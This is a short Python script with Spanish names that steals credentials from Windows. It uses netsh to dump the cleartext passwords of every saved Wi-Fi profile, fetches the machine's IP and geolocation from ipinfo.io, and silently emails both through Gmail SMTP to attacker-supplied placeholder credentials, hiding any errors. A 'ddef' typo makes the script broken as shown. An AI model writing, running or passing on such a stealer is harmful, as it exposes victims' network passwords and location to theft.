import subprocess,smtplib,re
import urllib.request
import json



resultado=''
lista=[]

def enviar_email(email,password,mensaje):
    
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,mensaje)
    server.quit()

redes=subprocess.run(['netsh', 'wlan', 'show', 'profile'], capture_output=True, text=True)
lista_redes=redes.stdout
lista_redes2=re.findall("(?:Profile\s*:\s)(.*)",lista_redes)
lista_redes3=map(str.strip,lista_redes2)
lista_redes4=list(lista_redes3)

for nombre_red in lista_redes4:
    #command2 = 'netsh', 'wlan', 'show', 'profile', f'name="{nombre_red}"','key=clear'
    resultado_actual=subprocess.run(['netsh', 'wlan', 'show', 'profile','name=',f'{nombre_red}','key=clear'], capture_output=True, text=True)
    resultado_actual.stdout
    resultado=resultado+resultado_actual.stdout
   
def ip_info():
    objetivo='https://ipinfo.io/json'
    contenido=urllib.request.urlopen(objetivo)
    cargajson=json.loads(contenido.read())
    
    for dato in cargajson:
        mensaje=dato + " : " + str(cargajson[dato])
        lista.append(mensaje)
    return lista
        
ddef mandar_datos(email,password):   
    enviar=json.dumps(ip_info(), indent=2)
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,enviar)
    server.quit()


try:  
    enviar_email('TuCorreo', 'Tucontraseña', resultado)
    #ip_info()
    mandar_datos('TuCorreo', 'Tucontraseña')
except:
    pass
